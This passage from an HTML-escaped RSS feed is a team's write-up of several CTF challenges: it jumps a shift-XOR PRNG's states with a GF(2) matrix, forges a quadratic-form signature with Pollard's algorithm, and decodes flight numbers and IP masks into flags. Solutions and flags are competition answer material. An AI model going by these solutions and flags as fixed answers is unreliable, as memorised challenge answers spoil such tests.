  s1 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; (s1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; a) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
  s[p] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (s1 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; s0 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (s1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (s0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; c))  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;They are utilizing the &amp;quot;inefficiency&amp;quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2&lt;sup&gt;100&lt;/sup&gt;). Of course the naive approach doesn&#39;t work - you will wait forever.&lt;/p&gt;

&lt;p&gt;However, if we are only considering the state transition (i.e., how &lt;code&gt;s&lt;/code&gt; is updated), we can see that it only involves bit shifting and XOR. Let&#39;s define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.&lt;/p&gt;

&lt;p&gt;We can write transitions under the definition (note that the $+$ operation is actually operated under $\text{GF}(2)$, i.e., it is a XOR):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$,&lt;/li&gt;
&lt;li&gt;$s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$,&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hence, we can define a $64^2\times64^2$ transition matrix $T$ over $\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.&lt;/p&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  &lt;strong&gt;Help.&lt;/strong&gt; I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn&amp;rsquo;t it be $O(m^{2.3737}\cdot\log n)$ to compute $M^n$ for a $m\times m$ matrix?).
&lt;/div&gt;
  

&lt;p&gt;Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: &lt;code&gt;FAKEFLAG{THIS_IS_FAKE_FLAG}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Oops, nope. I mean&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;circular-crypto-370-points&#34;&gt;circular (Crypto, 370 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;There are two endpoints provided, &lt;code&gt;pubkey&lt;/code&gt; and &lt;code&gt;verify&lt;/code&gt;. The &lt;code&gt;pubkey&lt;/code&gt; endpoint returns a fix &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;k&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://crypto02.chal.ctf.westerns.tokyo/&amp;#34;&lt;/span&gt; -X POST --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;cmd&amp;#34;:&amp;#34;pubkey&amp;#34;}&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# {&amp;#34;pubkey&amp;#34;:{&amp;#34;n&amp;#34;:&amp;#34;25299...&amp;#34;,&amp;#34;k&amp;#34;:&amp;#34;31019...&amp;#34;}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And one can submit &lt;code&gt;x&lt;/code&gt;, &lt;code&gt;y&lt;/code&gt; and &lt;code&gt;msg&lt;/code&gt; to the &lt;code&gt;verify&lt;/code&gt; endpoint. It is verifying a signature in the following way:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[x^2 + ky^2 \equiv \text{hash}(msg)\ (\text{mod}\ n).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;In particular, you can get the flag when the signature is correct and &lt;code&gt;msg == &#39;SUNSHINE RHYTHM&#39;&lt;/code&gt;. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \equiv m\ (\text{mod}\ n)$. This is a simplified version of OSS schemes.&lt;/p&gt;

&lt;p&gt;I was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I&#39;ve gave up deriving everything from nothing and came across to Pollard&#39;s algorithm (From &lt;em&gt;An Efficient Solution of the Congruence x&lt;sup&gt;2&lt;/sup&gt; + ky&lt;sup&gt;2&lt;/sup&gt; = m (mod n)&lt;/em&gt; by Pollard and Schnorr). Moreover, the algorithm is described very clearly in &lt;em&gt;An Exposition of Pollard&#39;s Algorithm for Quadratic Congruences&lt;/em&gt; by Shallit. I have an implementation of Pollard&#39;s algorithm following their procedures.&lt;/p&gt;

&lt;p&gt;Supplying $k$, $m$ and $n$ to Pollard&#39;s algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the &lt;code&gt;verify&lt;/code&gt; endpoint would give us the flag - &lt;code&gt;TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;birds-misc-41-points&#34;&gt;Birds (Misc, 41 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Nothing much is given from the challenge description, there are a multiple lines &lt;code&gt;/^[A-Z]{2}[0-9]{3,4}$/&lt;/code&gt;&#39;s.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;BC552
AC849
JL106
PQ448
JL901
LH908
NH2177&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After a bit of Googling, those are flight numbers. What do they mean? Let&#39;s see where they depart and arrive:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Flight&lt;/th&gt;
&lt;th&gt;Depart from&lt;/th&gt;
&lt;th&gt;Arrive to&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;BC552&lt;/td&gt;
&lt;td&gt;OKA&lt;/td&gt;
&lt;td&gt;NGO&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;AC849&lt;/td&gt;
&lt;td&gt;LHR&lt;/td&gt;
&lt;td&gt;YYZ&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;JL106&lt;/td&gt;
&lt;td&gt;ITM&lt;/td&gt;
&lt;td&gt;HND&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;PQ448&lt;/td&gt;
&lt;td&gt;TBS&lt;/td&gt;
&lt;td&gt;ODS&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;JL901&lt;/td&gt;
&lt;td&gt;HND&lt;/td&gt;
&lt;td&gt;OKA&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;LH908&lt;/td&gt;
&lt;td&gt;FRA&lt;/td&gt;
&lt;td&gt;LHR&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;NH2177&lt;/td&gt;
&lt;td&gt;NRT&lt;/td&gt;
&lt;td&gt;ITM&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Hmm... We can see some locations shown more than once. There must be some meaning. Let&#39;s connect them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;NRT -&amp;gt; ITM -&amp;gt; HND -&amp;gt; OKA -&amp;gt; NGO
FRA -&amp;gt; LHR -&amp;gt; YYZ
TBS -&amp;gt; ODS&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By taking the first letter from each of them, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;NIHON
FLY
TO&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Oh and finally we have the flag: &lt;code&gt;TWCTF{FLYTONIHON}&lt;/code&gt;. Unfortunately the finals is online this year... (And we are not qualified, too)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Addendum: We did!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&#34;mask-misc-26-points&#34;&gt;mask (Misc, 26 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;There is a list of IP addresses and maybe subnet mask in the challenge description.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;192.168.55.86/255.255.255.0
192.168.80.198/255.255.255.128
192.168.1.228/255.255.255.128
192.168.90.68/255.255.254.0
192.168.8.214/255.255.255.128
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is &lt;code&gt;0b111101&lt;/code&gt;, which is &lt;code&gt;=&lt;/code&gt; in ASCII... Is it encoded with base64?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mask.txt&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; s:
        lr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
        l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lr[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lr[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
        a&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;chr(int(l[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;int(r[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(a))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The output is: &lt;code&gt;TWCTF{Are-you-using-a-mask?}&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
